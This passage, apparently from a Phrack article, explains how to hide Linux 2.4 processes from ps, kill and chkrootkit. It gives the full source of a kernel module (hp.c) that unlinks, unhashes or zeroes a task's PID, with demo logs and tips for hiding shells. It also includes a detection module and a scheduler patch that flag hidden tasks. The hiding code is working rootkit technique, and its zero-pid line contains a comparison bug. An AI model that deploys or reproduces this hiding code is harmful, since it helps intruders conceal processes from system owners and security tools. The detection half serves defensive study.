+ [root@absinth ksched]# insmod hp.o pid=`pidof sleep` method=1
+ hp.o: init_module: Device or resource busy
+ Hint: insmod errors can be caused by incorrect module parameters,
+ including invalid IO or IRQ parameters
+    You may find more information in syslog or the output from dmesg
+ [root@absinth ksched]# tail -2 /var/log/messages
+ Mar 13 22:02:50 absinth kernel: [HP] address of task struct for pid
+ 1129 is 0xc0f44000
+ Mar 13 22:02:50 absinth kernel: [HP] removing process links
+ [root@absinth ksched]# ps aux | grep sleep
+ root      1140  0.0  0.4  1700  608 pts/2    S    22:03   0:00 grep sleep
+ [root@absinth ksched]# insmod hp.o task=0xc0f44000 method=1
+ hp.o: init_module: Device or resource busy
+ Hint: insmod errors can be caused by incorrect module parameters,
+ including invalid IO or IRQ parameters
+     You may find more information in syslog or the output from dmesg
+ [root@absinth ksched]# tail -1 /var/log/messages
+ Mar 13 22:03:53 absinth kernel: [HP] unhideing task at addr 0xc0f44000
+ Mar 13 22:03:53 absinth kernel: [HP] setting process links
+ [root@absinth ksched]# ps aux | grep sleep
+ root      1129  0.0  0.5  1848  672 pts/4    S    22:00   0:00 sleep 666
+ root      1143  0.0  0.4  1700  608 pts/2    S    22:04   0:00 grep sleep
+ [root@absinth ksched]#
+
+
+[Method 2] (actualy an added enhacement to method 1)
+
+ Point made. Now from the hash list
+
+ [root@absinth ksched]# insmod hp.o pid=`pidof sleep` method=2
+ hp.o: init_module: Device or resource busy
+ Hint: insmod errors can be caused by incorrect module parameters,
+ including invalid IO or IRQ parameters
+ You may find more information in syslog or the output from dmesg
+
+ [root@absinth ksched]# tail -2 /var/log/messages
+ Mar 13 22:07:04 absinth kernel: [HP] address of task struct for pid 1129
+ is 0xc0f44000
+ Mar 13 22:07:04 absinth kernel: [HP] unhashing pid
+ [root@absinth ksched]# insmod hp.o task=0xc0f44000 method=2
+ hp.o: init_module: Device or resource busy
+ Hint: insmod errors can be caused by incorrect module parameters,
+ including invalid IO or IRQ parameters
+       You may find more information in syslog or the output from dmesg
+ [root@absinth ksched]# tail -1 /var/log/messages
+ Mar 13 22:07:18 absinth kernel: [HP] unhideing task at addr 0xc0f44000
+ Mar 13 22:07:18 absinth kernel: [HP] hashing pid
+ [root@absinth ksched]# kill -9 1129
+ [root@absinth ksched]#
+
+So upon removing from the hash list the process also becomes invulnerable
+to kill signals and any other syscalls that use the hash list for that
+matter. This also hides your task from methods of uncovering like
+kill(pid,0) which chkrootkit [10] uses.
+
+* methods 1 and 2 arent that good at hideing shells since most have builtin
+job control and that requires a working find_task_by_pid() and
+for_each_task() (look at sys_setpgid() sources), however, if you know how
+to disable that it works just fine :P ok ill give you a hint, make the
+standard output/input not a terminal.
+
+
+[Method 3]
+
+But this is kids stuff; lets abuse the way the function that generates the
+pid list for the /proc VFS works.
+
+&lt;codesnip src=&quot;fs/proc/base.c&quot; line=1057&gt;
+static int get_pid_list(int index, unsigned int *pids)
+{
+        .......
+        for_each_task(p) {
+		.......
+                if (!pid)
+                        continue;
+&lt;/codesnip src=&quot;fs/proc/base.c&quot;&gt;
+
+Have you spoted the not ? :-) cmon its easy, just make our pid 0 and we
+wont get listed (pid 0 tasks are of a special kernel breed and thats why
+they dont get listed there - actualy the kernel itself, the first &quot;task&quot;
+and its cloned children like the swapper); also since we are changing the
+pid but not rehashing the pid position in the hash list all searches for
+pid 0 will go to the wrong hash and all searches for our old pid will
+find a task with a pid of 0, well it will fail each time. An interesting
+side effect of having pid 0 is that the task can call clone() [11] with a
+flag of CLONE_PID, effectively spawning hidden children as well;
+aint that a threat? The old pid can be recovered from tgid member of the
+task_struct since getpid() does it so can we, and moreover this method
+is so safe to do from user space since we arent complicating with
+possible race conditions screwing with the task list pointers. Well safe
+as long as your process doesnt exit as we are just changing its pid..
+
+&lt;codesnip src=&quot;kernel/timer.c&quot; line=710&gt;
+asmlinkage long sys_getpid(void)
+{
+	/* This is SMP safe - current-&gt;pid doesn't change */
+	return current-&gt;tgid;
+}
+&lt;/codesnip src=&quot;kernel/timer.c&quot;&gt;
+
+btw if we change only the pid to 0 there will be no danger that another
+process migth be assigned the same pid we _had_ because in the get_pid()
+func theres a check for tgid also, which we leave untouched and use to
+restore the pid (just read the source for hp.c)
+
+ [root@absinth ksched]# ps aux | grep sleep
+ root      1991  0.2  0.5  1848  672 pts/7    S    19:13   0:00 sleep 666
+ root      1993  0.0  0.4  1700  608 pts/6    S    19:13   0:00 grep sleep
+ [root@absinth ksched]# insmod hp.o pid=`pidof sleep` method=4
+ hp.o: init_module: Device or resource busy
+ Hint: insmod errors can be caused by incorrect module parameters,
+ including invalid IO or IRQ parameters
+       You may find more information in syslog or the output from dmesg
+ [root@absinth ksched]# tail -2 /var/log/messages
+ Mar 16 19:14:07 absinth kernel: [HP] address of task struct for pid 1991
+ is 0xc30f0000
+ Mar 16 19:14:07 absinth kernel: [HP] zerofing pid
+ [root@absinth ksched]# ps aux | grep sleep
+ root      1999  0.0  0.4  1700  600 pts/6    R    19:14   0:00 grep sleep
+ [root@absinth ksched]# kill -9 1991
+ bash: kill: (1991) - No such process
+ [root@absinth ksched]# insmod hp.o task=0xc30f0000 method=4
+ hp.o: init_module: Device or resource busy
+ Hint: insmod errors can be caused by incorrect module parameters,
+ including invalid IO or IRQ parameters
+       You may find more information in syslog or the output from dmesg
+ [root@absinth ksched]# tail -1 /var/log/messages
+ Mar 16 19:14:47 absinth kernel: [HP] unhideing task at addr 0xc0f44000
+ Mar 16 19:14:47 absinth kernel: [HP] reverting zero pid to 1991
+ [root@absinth ksched]# ps aux | grep sleep
+ root      1991  0.0  0.5  1848  672 pts/7    S    19:13   0:00 sleep 666
+ [root@absinth ksched]#
+
+    See how cool is this? I might say that all this article is about is
+zerofing pids in task_structs :-)
+(and you only have to change 2 bytes at most to hide a process !)
+
+* your task should never call exit when having pid 0 or it will suck from
+do_exit which is called by sys_exit
+
+&lt;codesnip src=&quot;kernel/exit.c&quot; line=480&gt;
+NORET_TYPE void do_exit(long code)
+{
+        .......
+        if (!tsk-&gt;pid)
+                panic(&quot;Attempted to kill the idle task!&quot;);
+&lt;codesnip src=&quot;kernel/exit.c&quot;&gt;
+
+That is if you hide your shell like this be sure to unhide it (set its pid
+to something) before you `exit`.. or , dont mind me and exit the whole
+system hehe. In a compromised environment do_exit could have that
+particular part overwritten with nops (no operation instruction - an
+asm op code that does nothing).
+
+You can use for the method field when insmoding hp.o any combination of the
+3 bit flags presented
+
+
+
+--[ 4 - can you scream ? ( countering)
+
+    Should you scream? Well, yes. Detecting the first method can be a
+waiting game or at best, a hide and seek pain-in-the-ass inside all the
+waiting queues around the kernel, while holding the big lock. But no, its
+not imposible to find a hidden process even if it could mean running a rt
+task that will take over the cpu(s) and binary search the kmem device.
+This could be done as a brute force for certain magic numbers inside the
+task struct whithin the memory range one could get allocated and look if
+its valid with something like testing its virtual memory structures but
+this has the potential to be very unreliable (and ..hard).
+
+Finding tasks that are hiden this way is a pain as no other structure
+contains a single tasks list so that in a smooth soop we could itterate and
+see what is not inside the linked list and pidhash and if there would be we
+wouldve probably removed out task from there too hehe. If you think by now
+this will be the ultimate kiddie-method, hope no more, were smart people,
+for every problem we release the cure also. So there is a ..way :) .. a
+clever way exploiting what every process desires, the need to run ;-} *evil
+grin*
+
+This method can take a while however, if a process blocks on some call like
+listen() since we only catch them when they _run_ while being _hidden_.
+
+	Other checks could verify the integrity of the linked list, like the
+order in the list and the time stamps or something (know that ptrace() [12]
+fucks with this order).
+
+    To backdoor switch_to (more exactly __switch_to, remember the first
+is a define) is a bit tricky from a module, however ive done it but it
+doesnt seem very portable so instead, from a module, we hook the syscall
+gate thus exploiting the *need to call* of programs :-), which is very
+easy, and every program in order to run usefuly has to call some syscalls,
+right?
+
+But so that you know, to trap into schedule() from a module (or from kmem
+for that matter) we find the address of __switch_to(). We could do this
+two ways, either do some pattern matching for calls inside schedule() or
+notice that sys_fork() is right after __switch_to() and do some math.
+After that just insert a hook at the end of __switch_to (doing it before
+__switch_to would make our code execute in unsafe environment - krash -
+since its a partialy switched environment).
+
+So this is what the module does, the kernel patch, sh.patch uses the
+mentioned need to run of processes by inserting a call inside the
+schedule() function which was described earlier and checks the structs
+against the current process.
+
+    So how do we deal with _real_ pid 0 tasks, that we dont catch them
+as being rogues? Remember what ive said about the pid 0 tasks being a
+special breed, they are kernel threads in effect so we can differentiate
+them from normal user land processes because they have no allocated memory
+struct / no userland memory dooh! / and no connected binary format struct
+for that matter (a special case would be when one would have its evil task
+as a mangled kernel thread but i guess we could tell even then by name or
+the number of active kernel threads if its an evil one).
+
+Anyway for an example with the *need ro call* method.. For this we launch a
+bash session so that we can _put it on the run queue_ by writing some
+command on it.. like i said, we catch these tasks only when they do
+syscalls
+
+ [root@absinth ksched]# gcc -c -I/$LINUXSRC/include src/sht.c -o src/sht.o
+ [root@absinth ksched]# insmod sht.o
+ [root@absinth ksched]# insmod hp.o pid=`pidof hidden_bash` method=1
+ hp.o: init_module: Device or resource busy
+ Hint: insmod errors can be caused by incorrect module parameters,
+ including invalid IO or IRQ parameters
+       You may find more information in syslog or the output from dmesg
+ ( now we type some command in the hidden bash session to make it run )
+ [root@absinth root]# tail /var/log/messages
+ .......
+ Jul  8 19:43:26 absinth kernel: [SHT] task pid 562 &lt;bash&gt; task addr
+ 0xc72f0000 syscall 175 - TASK IS HIDDEN ( NOT ON LINKED LIST / on pidhash
+ list / pid is valid )
+ Jul  8 19:43:26 absinth kernel: [SHT] task pid 562 &lt;bash&gt; task addr
+ 0xc72f0000 syscall 3 - TASK IS HIDDEN ( NOT ON LINKED LIST / on pidhash
+ list / pid is valid )
+ [root@absinth ksched]# rmmod sht
+
+Voila. It works.. it also looks for unhashed or pid 0 tasks; the only
+problem atm is the big output which ill sort out with some list hashed by
+the task address/pid/processor/start_time so that we only get 1 warning
+per hidden process :-/
+
+To use the kernel patch instead of the module change to the top of your
+linux source tree and apply it with `patch -p0 &lt; sh.patch` (if you have a
+layout like /usr/src/linux/, cd into /usr/src/). The patch is for the
+2.4.30 branch (although it migth work with other 2.4 kernels; if you need
+it for other kernel versions check with me) and it works just like the
+module just that it hooks directly into the schedule() function and so can
+catch sooner any hidden tasks.
+
+    Now if some of you are thinking at this point why make public
+research like this when its most likely to get abused, my answer is
+simple, dont be an ignorant, if i have found most of this things on my own
+I dont have any reason to believe others havent and its most likely to
+already been used in the wild, maybe not that widespead but lacking the
+right tools to peek in the kernel memory, we would never know if and how
+used it is already. So shut your suck hole .. the only ppl hurting from
+this are the underground hackers, but then again they are brigth people
+and other more leet methods are ahead :-) just think about hideing a task
+inside another task (sshutup ubra !! lol no peeking)
+.. you will read about it probably in another small article
+
+
+--[ 5 - references
+
+ [1] manual pages for ps(1) , top(1) , pstree(1) and the proc(5) interface
+     http://linux.com.hk/PenguinWeb/manpage.jsp?section=1&amp;name=ps
+     http://linux.com.hk/PenguinWeb/manpage.jsp?section=1&amp;name=top
+     http://linux.com.hk/PenguinWeb/manpage.jsp?section=1&amp;name=pstree
+     http://linux.com.hk/PenguinWeb/manpage.jsp?section=5&amp;name=proc
+
+ [2] LRK - Linux Root Kit
+     by Lord Somer &lt;webmaster@lordsomer.com&gt;
+     http://packetstormsecurity.org/UNIX/penetration/rootkits/lrk5.src.tar.gz
+
+ [3] LKM HACKING
+     by pragmatic from THC
+     http://reactor-core.org/linux-kernel-hacking.html
+
+ [4] Syscall redirection without modifying the syscall table
+     by Silvio Cesare &lt;silvio@big.net.au&gt;
+     http://www.big.net.au/~silvio/stealth-syscall.txt
+     http://spitzner.org/winwoes/mtx/articles/syscall.htm
+
+ [5] Phrack 59/0x04 - Handling the Interrupt Descriptor Table
+     by kad &lt;kadamyse@altern.org&gt;
+     http://www.phrack.org/show.php?p=59&amp;a=4
+
+ [6] Phrack 61/0x0e - Kernel Rootkit Experiences
+     by stealth &lt;stealth@segfault.net&gt;
+     http://www.phrack.org/show.php?p=61&amp;a=14
+
+ [7] Linux kernel internals #Process and Interrupt Management
+     by Tigran Aivazian &lt;tigran@veritas.com&gt;
+     http://www.tldp.org/LDP/lki/lki.html
+
+ [8] Scheduling in UNIX and Linux
+     by moz &lt;moz@compsoc.man.ac.uk&gt;
+     http://www.kernelnewbies.org/documents/schedule/
+
+ [9] KernelAnalysis-HOWTO #Linux Multitasking
+     by Roberto Arcomano &lt;berto@fatamorgana.com&gt;
+     http://www.tldp.org/HOWTO/KernelAnalysis-HOWTO.html
+
+ [10] chkrootkit - CHecK ROOT KIT
+      by Nelson Murilo &lt;nelson@pangeia.com.br&gt;
+      http://www.chkrootkit.org/
+
+ [11] manual page for clone(2)
+      http://linux.com.hk/PenguinWeb/manpage.jsp?section=2&amp;name=clone
+
+ [12] manual page for ptrace(2)
+      http://linux.com.hk/PenguinWeb/manpage.jsp?section=2&amp;name=ptrace
+
+
+
+--[ 6 - and the game dont stop..
+
+    Hei fukers! octavian, trog, slider, raven and everyone else I keep
+close with, thanks for being there and wasteing time with me, sometimes I
+really need that ; ruffus , nirolf and vadim wtf lets get the old team on
+again .. bafta pe oriunde sunteti dudes.
+
+    If you notice any typos, mistakes, have anything to communicate with
+me feel free make contact.
+
+ web  - w3.phi.group.eu.org
+ mail - ubra_phi.group.eu.org
+ irc  - Efnet/Undernet #PHI
+
+* the contact info and web site is and will not be valid/up for a few
+weeks while im moving house, sorry ill get things settled ASAP ( that
+is up until about august of 2005 ), meanwhile you can get in touch
+with me on the email dragosg_personal.ro
+
+
+--[ 7 - sources
+
+&lt;++&gt; src/Makefile
+
+all: sht.c hp.c
+	gcc -c -I/EDIT_HERE_YOUR_LINUX_SOURCE_TREE/linux/include sht.c hp.c
+
+
+
+&lt;--&gt;
+
+
+
+&lt;++&gt; src/hp.c
+/*|
+ *	hp - hide pid v1.0.0
+ *	 hides a pid using different methods
+ *	 ( demo code for hideing processes paper )
+ *
+ *	syntax : insmod hp.o (pid=pid_no|task=task_addr) [method=0x1|0x2|0x4]
+ *
+ *	coded in 2004 by ubra from PHI Group
+ *	 web  - ubra.phi.group.za.org
+ *	 mail - ubra_phi.group.za.org
+ *	 irc  - Efnet/Undernet#PHI
+|*/
+
+
+
+#define __KERNEL__
+#define MODULE
+
+
+#include &lt;linux/module.h&gt;
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/sched.h&gt;
+
+
+
+pid_t pid = 0 ;
+struct task_struct *task = 0 ;
+unsigned char method = 0x3 ;
+
+
+
+int init_module ( ) {
+	if ( pid ) {
+		task = find_task_by_pid(pid) ;
+		printk ( &quot;[HP] address of task struct for pid %i is 0x%p\n&quot; , pid , task ) ;
+		if ( task ) {
+			write_lock_irq(&amp;tasklist_lock) ;
+			if ( method &amp; 0x1 ) {
+				printk(&quot;[HP] removing process links\n&quot;) ;
+				REMOVE_LINKS(task) ;
+			}
+			if ( method &amp; 0x2 ) {
+				printk(&quot;[HP] unhashing pid\n&quot;) ;
+				unhash_pid(task) ;
+			}
+			if ( method &amp; 0x4 ) {
+				printk(&quot;[HP] zerofing pid\n&quot;) ;
+				task-&gt;pid == 0 ;
+			}
+			write_unlock_irq(&amp;tasklist_lock) ;
+		}
+	} else if ( task ) {
+		printk ( &quot;[HP] unhideing task at addr 0x%x\n&quot; , task ) ;
+		write_lock_irq(&amp;tasklist_lock) ;
+		if ( method &amp; 0x1 ) {
+			printk(&quot;[HP] setting process links\n&quot;) ;
+			SET_LINKS(task) ;
+		}
+		if ( method &amp; 0x2 ) {
+			printk(&quot;[HP] hashing pid\n&quot;) ;
+			hash_pid(task) ;
+		}
+		if ( method &amp; 0x4 ) {
+			printk ( &quot;[HP] reverting 0 pid to %i\n&quot; , task-&gt;tgid ) ;
+			task-&gt;pid = task-&gt;tgid ;
+		}
+		write_unlock_irq(&amp;tasklist_lock) ;
+	}
+	return 1 ;
+}
+
+
+
+
+MODULE_PARM ( pid , &quot;i&quot; ) ;
+MODULE_PARM_DESC ( pid , &quot;the pid to hide&quot; ) ;
+
+MODULE_PARM ( task , &quot;l&quot; ) ;
+MODULE_PARM_DESC ( task , &quot;the address of the task struct to unhide&quot; ) ;
+
+MODULE_PARM ( method , &quot;b&quot; ) ;
+MODULE_PARM_DESC ( method , &quot;a bitwise OR of the method to use , 0x1 - linked list , 0x2 - pidhash , 0x4 - zerofy pid&quot; ) ;
+
+
+MODULE_AUTHOR(&quot;ubra @ PHI Group&quot;) ;
+MODULE_DESCRIPTION(&quot;hp - hide pid v1.0.0 - hides a task with 3 possible methods&quot;) ;
+MODULE_LICENSE(&quot;GPL&quot;) ;
+EXPORT_NO_SYMBOLS ;
+
+
+
+&lt;--&gt;
+
+
+
+&lt;++&gt; src/sht.c
+/*|
+ *	sht - search hidden tasks v1.0.0
+ *	 checks tasks to be visible upon entering syscall
+ *	 ( demo code for hideing processes paper )
+ *
+ *	syntax : insmod sht.o
+ *
+ *	coded in 2005 by ubra from PHI Group
+ *	 web  - w3.phi.group.za.org
+ *	 mail - ubra_phi.group.za.org
+ *	 irc  - Efnet/Undernet#PHI
+|*/
+
+
+
+#define __KERNEL__
+#define MODULE
+
+
+#include &lt;linux/kernel.h&gt;
+#include &lt;linux/module.h&gt;
+#include &lt;linux/sched.h&gt;
+
+
+
+struct idta {
+        unsigned short size ;
+        unsigned long addr __attribute__((packed)) ;
+} ;
+
+
+struct idt {
+        unsigned short offl ;
+        unsigned short seg ;
+        unsigned char pad ;
+        unsigned char flags ;
+        unsigned short offh ;
+} ;
+
+
+
+unsigned long get_idt_addr ( void ) {
+	struct idta idta ;
+
+	asm ( &quot;sidt %0&quot; : &quot;=m&quot; (idta) ) ;
+	return idta.addr ;
+}
+
+
+
+unsigned long get_int_addr ( unsigned int intp ) {
+	struct idt idt ;
+	unsigned long idt_addr ;
+
+	idt_addr = get_idt_addr() ;
+	idt = *((struct idt *) idt_addr + intp) ;
+	return idt.offh &lt;&lt; 16 | idt.offl ;
+}
+
+
+
+void hook_int ( unsigned int intp , unsigned long new_func , unsigned long *old_func ) {
+	struct idt idt ;
+	unsigned long idt_addr ;
+
+	if ( old_func )
+		*old_func = get_int_addr(intp) ;
+	idt_addr = get_idt_addr() ;
+	idt = *((struct idt *) idt_addr + intp) ;
+	idt.offh = (unsigned short) (new_func &gt;&gt; 16 &amp; 0xFFFF) ;
+	idt.offl = (unsigned short) (new_func &amp; 0xFFFF) ;
+	*((struct idt *) idt_addr + intp) = idt ;
+	return ;
+}
+
+
+
+asmlinkage void check_task ( struct pt_regs *regs , struct task_struct *task ) ;
+asmlinkage void stub_func ( void ) ;
+
+unsigned long new_handler = (unsigned long) &amp;check_task ;
+unsigned long old_handler ;
+
+
+
+void stub_handler ( void ) {
+	asm(&quot;.globl stub_func			\n&quot;
+	    &quot;.align 4,0x90			\n&quot;
+	    &quot;stub_func :			\n&quot;
+	    &quot;	pushal				\n&quot;
+	    &quot;	pushl	%%eax			\n&quot;
+	    &quot;	movl	$-8192 , %%eax		\n&quot;
+	    &quot;	andl	%%esp , %%eax		\n&quot;
+	    &quot;	pushl	%%eax			\n&quot;
+	    &quot;	movl	-4(%%esp) , %%eax	\n&quot;
+	    &quot;	pushl	%%esp			\n&quot;
+	    &quot;	call	*%0			\n&quot;
+	    &quot;	addl	$12 , %%esp		\n&quot;
+	    &quot;	popal				\n&quot;
+	    &quot;	jmp	*%1			\n&quot;
+	    :: &quot;m&quot; (new_handler) , &quot;m&quot; (old_handler) ) ;
+}
+
+
+
+asmlinkage void check_task ( struct pt_regs *regs , struct task_struct *task ) {
+	struct task_struct *task_p = &amp;init_task ;
+	unsigned char on_ll = 0 , on_ph = 0 ;
+
+	if ( ! task-&gt;mm )
+		return ;
+	do {
+		if ( task_p == task ) {
+			on_ll = 1 ;
+			break ;
+		}
+		task_p = task_p-&gt;next_task ;
+	} while ( task_p != &amp;init_task ) ;
+	if ( find_task_by_pid(task-&gt;pid) == task )
+		on_ph = 1 ;
+	if ( ! on_ll || ! on_ph || ! task-&gt;pid )
+		printk ( &quot;[SHT] task pid %i &lt;%s&gt; task addr 0x%x syscall %i - TASK IS HIDDEN ( %s / %s / %s )\n&quot; , task-&gt;pid , task-&gt;comm , task , regs-&gt;orig_eax , on_ll ? &quot;on linked list&quot; : &quot;NOT ON LINKED LIST&quot; , on_ph ? &quot;on pidhash list&quot; : &quot;NOT ON PIDHASH LIST&quot; , task-&gt;pid ? &quot;pid is valid&quot; : &quot;PID IS INVALID&quot; ) ;
+	return ;
+}
+
+
+
+int sht_init ( void ) {
+	hook_int ( 128 , (unsigned long) &amp;stub_func , &amp;old_handler ) ;
+	printk(&quot;[SHT] loaded - monitoring tasks integrity\n&quot;) ;
+	return 0 ;
+}
+
+
+
+void sht_exit ( void ) {
+	hook_int ( 128 , old_handler , NULL ) ;
+	printk(&quot;[SHT] unloaded\n&quot;) ;
+	return ;
+}
+
+
+
+module_init(sht_init) ;
+module_exit(sht_exit) ;
+
+
+
+
+MODULE_AUTHOR(&quot;ubra / PHI Group&quot;) ;
+MODULE_DESCRIPTION(&quot;sht - search hidden tasks v1.0.0&quot;) ;
+MODULE_LICENSE(&quot;GPL&quot;) ;
+EXPORT_NO_SYMBOLS ;
+
+
+&lt;--&gt;
+
+
+
+&lt;++&gt; src/sh.patch
+--- linux-2.4.30/kernel/sched_orig.c	2004-11-17 11:54:22.000000000 +0000
++++ linux-2.4.30/kernel/sched.c	2005-07-08 13:29:16.000000000 +0000
+@@ -534,6 +534,25 @@
+ 	__schedule_tail(prev);
+ }
+ 
++asmlinkage void phi_sht_check_task(struct task_struct *prev, struct task_struct *next)
++{
++	struct task_struct *task_p = &amp;init_task;
++	unsigned char on_ll = 0, on_ph = 0;
++
++	do {
++		if(task_p == prev) {
++			on_ll = 1;
++			break;
++		}
++		task_p = task_p-&gt;next_task ;
++	} while(task_p != &amp;init_task);
++	if (find_task_by_pid(prev-&gt;pid) == prev)
++		on_ph = 1 ;
++	if (!on_ll || !on_ph || !prev-&gt;pid)
++		printk(&quot;[SHT] task pid %i &lt;%s&gt; task addr 0x%x ( next task pid %i &lt;%s&gt; next task addr 0x%x ) - TASK IS HIDDEN ( %s / %s / %s )\n&quot;, prev-&gt;pid, prev-&gt;comm, prev, next-&gt;pid, next-&gt;comm, next, on_ll ? &quot;on linked list&quot; : &quot;NOT ON LINKED LIST&quot;, on_ph ? &quot;on pidhash list&quot; : &quot;NOT ON PIDHASH LIST&quot;, prev-&gt;pid ? &quot;pid is valid&quot; : &quot;PID IS INVALID&quot;);
++	return;
++}
++
+ /*
+  *  'schedule()' is the scheduler function. It's a very simple and nice
+  * scheduler: it's not perfect, but certainly works for most things.
+@@ -634,6 +653,13 @@
+ 	task_set_cpu(next, this_cpu);
+ 	spin_unlock_irq(&amp;runqueue_lock);
+ 
++	/*
++	 * check task`s structures before we do any scheduling decision
++	 * skip any kernel thread which might yeld false positives
++	 */
++	if(prev-&gt;mm)
++		phi_sht_check_task(prev, next);
++
+ 	if (unlikely(prev == next)) {
+ 		/* We won't go through the normal tail, so do this by hand */
+ 		prev-&gt;policy &amp;= ~SCHED_YIELD;
+&lt;--&gt;
+
+|=[ EOF ]=---------------------------------------------------------------=|
+
+
+</pre>
+
+</div>
+</div>
+
+</center>
+
+<div align="center" class="texto-2-bold">
+[ <a href="../../index.html" title="News">News</a> ]
+[ <a href="../../" title="Paper Feed">Paper Feed</a> ]
+[ <a href="../../issues/71/1.html" title="Issues">Issues</a> ]
+[ <a href="../../authors.html" title="Authors">Authors</a> ]
+[ <a href="../../archives/" title="Archives">Archives</a> ]
+[ <a href="../../contact.html" title="Contact">Contact</a> ]
+</div>
+
+<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
+</body>
+</html>
